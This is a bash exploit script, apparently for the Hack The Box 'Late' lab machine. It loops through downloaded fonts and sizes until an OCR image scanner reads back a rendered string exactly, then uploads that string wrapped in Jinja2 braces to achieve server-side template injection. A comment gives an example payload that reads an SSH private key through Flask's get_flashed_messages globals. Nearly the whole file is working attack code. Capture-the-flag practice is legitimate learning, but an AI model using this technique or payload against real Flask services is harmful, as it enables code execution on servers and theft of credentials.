#!/bin/bash

# Script to find the font and size for payload execution

# Example:
#
# Read private key -> ./validateSize.sh 'get_flashed_messages["__globals__"]["__builtins__"].open("/home/svc_acc/.ssh/id_rsa").read()'

# extract fonts
if [ ! -f fonts.txt ]; then
	curl -s https://www.azfonts.net/fonts/popular | grep "font-item__title" -A 1 | grep -v "font-item__title" | awk -F">" '{print $2}' | sed 's/<\/strong//g' | tr -s '\n' | sed '51,100d' > fonts.txt
fi

# variables
c=1
payload=$1
url="http://images.late.htb/scanner"

while read font; do
	clear
	sleep 2
	echo $c "[+] "$font
	size=8
	for i in $(seq 1 20); do
		data=$(echo Size : $size - Fontsize : $font)
		convert -pointsize $size -font "$font" label:"$payload" data.png
		sleep 0.5
		echo -e "\t" "Fontsize : $size"
		output=$(curl -is -XPOST -F "file=@data.png" $url | grep "<p>" | awk -F ">" '{print $2}')
		echo -e "\t" $output
		if [ "$output" = "$payload" ]; then
			echo -e "\n\n[!] Same payload -> " $data
			exec="{{ $payload }}"
			convert -pointsize $size -font "$font" label:"$exec" data.png
			echo -e "[+] Payload converted to execution:\n"
			curl -s -XPOST -F "file=@data.png" $url
			exit 1
		fi
		let size+=2
	done
	let c+=1
done < fonts.txt
